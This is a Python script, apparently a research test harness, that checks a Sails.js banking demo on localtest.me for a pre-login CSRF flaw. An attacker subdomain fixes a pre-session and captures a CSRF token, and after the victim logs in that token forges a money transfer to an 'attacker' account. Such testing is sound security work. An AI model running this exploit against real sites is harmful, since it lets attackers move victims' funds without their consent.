import requests
from bs4 import BeautifulSoup
import random

import http.client
http.client._MAXHEADERS = 1000

TARGET = 'http://localtest.me/'
ATTACKER = 'http://attack.localtest.me/'
PRIVATE_KEY = './server/localtest.me.crt'

USER1 = random.randint(10000, 99999)
USER2 = random.randint(10000, 99999)
PASSWORD = random.randint(10000, 99999)
ammount1 = 100
ammount2 = 200

session_cookie_name = 'sails.sid'
csrf_form_id = 'csrf_token'
csrf_form_name = '_csrf'

LOGOUT_MESSAGE = '<button type="submit">Login</button>'
CSRF_FAIL_WITHOUT_LOGIN = "Internal Server Error"

def get_csrf_token(page):
    return BeautifulSoup(page, 'html.parser').find(id="csrf_token").attrs['value']

def get_csrf_token_sails(page):
    return page.split("window.SAILS_LOCALS = { _csrf: unescape('")[1].split("'")[0]

def signup_sails(id, password = PASSWORD):
    r = s.get(TARGET + 'signup')
    assert 'Please enter your full name.' in r.text

    csrf_token = get_csrf_token_sails(r.text)
    data = {'_csrf' : csrf_token, "fullName" : id , "emailAddress" : f"{id}@a.com", "password" : password, "confirmPassword" : PASSWORD, "agreed" : True}
    r = s.post(TARGET + 'api/v1/entrance/signup', data = data)
    assert 'OK' or 'Conflict' in r.text
    
    r = s.get(TARGET)
    assert f'Welcome {id}.' in r.text

    return r

def login_sails(id, password = PASSWORD):
    r = s.get(TARGET + 'login', verify = False)
    assert 'Sign in to your account' in r.text

    csrf_token = get_csrf_token_sails(r.text)
    data = {'_csrf' : csrf_token, "emailAddress" : f"{id}@a.com", "password" : password, 'rememberMe': 0}
    r = s.put(TARGET + 'api/v1/entrance/login', data = data)
    assert 'OK' in r.text

    r = s.get(TARGET)
    assert f'Welcome {id}.' in r.text

    return r

def logout_sails():
    r = s.get(TARGET + 'api/v1/account/logout')
    assert 'OK' in r.text
    r = s.get(TARGET + 'login')
    assert f'Sign in to your account' in r.text


def transfer_sails(target, ammount, csrf_token):
    data = {'ammount' : ammount, 'target' : target, csrf_form_name : csrf_token}
    return s.post(TARGET + 'transfer', data = data)

def get_balance(page):
    return int(page.split("Your <b>balance</b> is ")[1].split('<br>')[0])


with requests.Session() as s:
    for user in ['alice', 'bob', 'john_doe', 'attacker']:
        try:
            signup_sails(user, user)
            logout_sails()
        except:
            pass

    for user in [USER1, USER2]:
        signup_sails(user, PASSWORD)
        logout_sails()


### Test correct functionality
with requests.Session() as s:
    print("[+] Testing login")

    ### Access main page
    r = s.get(TARGET, verify = False)
    assert LOGOUT_MESSAGE in r.text

    ### Fail to perform CSRF protected operation
    csrf_token = get_csrf_token(r.text)
    r = transfer_sails(USER1, 100, csrf_token)
    assert CSRF_FAIL_WITHOUT_LOGIN in r.text

    ### Login
    r = login_sails(USER1, PASSWORD)

    ### Success performing CSRF protected operation
    current_balance = get_balance(r.text)
    csrf_token = get_csrf_token(r.text)

    r = transfer_sails('attacker', ammount1, csrf_token)
    assert f"Successfull transferred {ammount1} from {USER1} to attacker" in r.text
    current_balance -= ammount1

    r = s.get(TARGET, verify = False)
    assert f'Welcome {USER1}.' in r.text
    assert str(current_balance) in r.text

    ### Logout
    logout_sails()

    print("  - Correct behaviour confirmed")


with requests.Session() as s:
    print("[+] Trying pre-login without fixation")

    r_target = s.get(TARGET, verify = False)
    assert LOGOUT_MESSAGE in r_target.text

    ### TARGET LOGIN
    r_target = login_sails(USER1)
    assert current_balance == get_balance(r_target.text)

    ### ATTACKER tries performing CSRF protected operation on behalf uf USER1 WITHOUT pre-fixating the secret
    ### Attacker (wrongly) Setting Pre-Session
    s.get(ATTACKER, verify = False)
    r_attacker = s.get(ATTACKER + 'set_pre_session')
    ### extract csrf token to use later
    csrf_token_attacker = get_csrf_token(r_attacker.text)

    r_attacker = transfer_sails('attacker', ammount2, csrf_token_attacker)
    assert r_attacker.status_code == 403
    assert "Forbidden" in r_attacker.text

    logout_sails()

    print("  - CSRF attack failed without pre-session")


print("[+] Sanity Checks passed")

with requests.Session() as s:
    print("[+] Testing pre-login CSRF attack")

    ### Attacker Setting Pre-Session
    s.get(ATTACKER, verify = False)
    r_attacker = s.get(ATTACKER + 'set_pre_session')
    ### extract csrf token to use later
    csrf_token_attacker = get_csrf_token(r_attacker.text)


    ### TARGET LOGIN
    r_target = login_sails(USER1)
    assert current_balance == get_balance(r_target.text)

    ### ATTACKER Succeeds in performing CSRF protected operation on behalf of USER1
    r_attacker = transfer_sails('attacker', ammount2, csrf_token_attacker)

    assert f"Successfull transferred {ammount2} from {USER1} to attacker" in r_attacker.text, " NOT VULNERABLE to pre-login CSRF attack"
    current_balance -= ammount2

    r = s.get(TARGET, verify = False)
    assert f'Welcome {USER1}.' in r.text
    assert str(current_balance) in r.text

    logout_sails()

    print("  - Vulnerable to pre-login CSRF attack")



